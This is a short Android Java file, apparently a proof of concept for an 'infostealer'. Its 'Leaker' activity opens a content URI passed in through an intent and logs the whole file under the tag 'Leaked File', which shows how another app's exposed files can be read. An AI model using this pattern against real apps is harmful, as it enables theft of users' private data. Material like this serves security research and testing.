package com.example.infostealer;

import androidx.appcompat.app.AppCompatActivity;

import android.os.Bundle;
import android.util.Log;

import org.apache.commons.io.IOUtils;

import java.io.IOException;

public class Leaker extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_leaker);

        try {
            Log.d("Leaked File", IOUtils.toString( getContentResolver().openInputStream(getIntent().getData())) );
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}